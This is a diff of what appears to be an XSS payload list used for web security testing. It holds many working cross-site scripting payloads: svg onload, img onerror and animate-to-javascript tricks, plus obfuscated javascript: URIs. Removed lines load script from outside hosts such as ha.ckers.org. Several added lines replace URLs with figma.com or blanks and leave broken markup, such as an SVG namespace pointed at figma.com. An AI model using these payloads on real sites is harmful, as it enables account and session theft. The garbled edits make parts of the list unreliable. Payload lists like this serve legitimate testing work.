@@ -25,19 +25,19 @@ a
 <a href="/multi/js-object2.php?p=1">Case 18 - Quoteless Inline Double Injection in JS object with Nested Array</a>
 <a href="/xss.php?b1=1">Case 03 - Inline HTML Injection with Double Quotes (b1)</a>
 <svg/onload=alert(/XSS/.source)>.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
-.... <center><H1>HTML-Injection-Test</H1><img/src="https://www.youtube.com/oops"/width="400"/height="300"><br><h2/style="font-size:30px;color:red">Warning</h2><br><img/src=//secgeek.net/images/fake.png>...................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<A HREF="http://66.102.7.147/">XSS</A>
+.... <center><H1>HTML-Injection-Test</H1><img/src="https://www.figma.com/"/width="400"/height="300"><br><h2/style="font-size:30px;color:red">Warning</h2><br><img/src=//secgeek.net/images/fake.png>...................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://figma.com"></SCRIPT>
+<A HREF="https://figma.com">XSS</A>
 <script>alert(1);</script>
 <svg><a><rect width=100% height=100%>
 <svg><a><rect width=100% height=100%><animate attributeName=width from=0 to=100% dur=2s>
-<svg><a><rect width=100% height=100% /><animate attributeName=href to=//google.com>
-<svg><a><rect width=100% height=100%><animate attributeName=href from=//google.com to=?>
+<svg><a><rect width=100% height=100% /><animate attributeName=href to=>
+<svg><a><rect width=100% height=100%><animate attributeName=href from= to=?>
 <animate attributeName=href to=javascript:alert(1)>
 <animate attributeName=href from=javascript:alert(1) to=?>
 <svg><a><rect width=100% height=100% /><animate attributeName=href to=javas&#99ript:alert(1)>
-<svg width=12cm height=9cm><a><image href=//brutelogic.com.br/yt.jpg /><animate attributeName=href values=javas&#99ript:alert(1)>
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg width=12cm height=9cm><a><image /><animate attributeName=href values=javas&#99ript:alert(1)>
+<svg xmlns="https://figma.com" onload="alert(document.domain)"/>
 <tag handler=code>
 <b onclick=alert(1)>click me!
 <img src=x onerror=alert(1)>
@@ -76,6 +76,6 @@ var n = {a: “-alert(1)}//\”, b: “-alert(1)}//\”};
 p=\&q=-alert(1)//
 "j&𝗮𝗺𝗽;#𝟲𝟱;vascript:alert()">CLICK</a>
 javascript%𝟬𝟵:alert()
-<​script src='//secrash[.]com/WhitelistUrl[.]com'><​/script>
+<​script src='[.]com/WhitelistUrl[.]com'><​/script>
 javasc\nript:alert()
 <a href='javascript​:alert(1)' accesskey='X'>CLICK CTRL+X+ENTER</a>
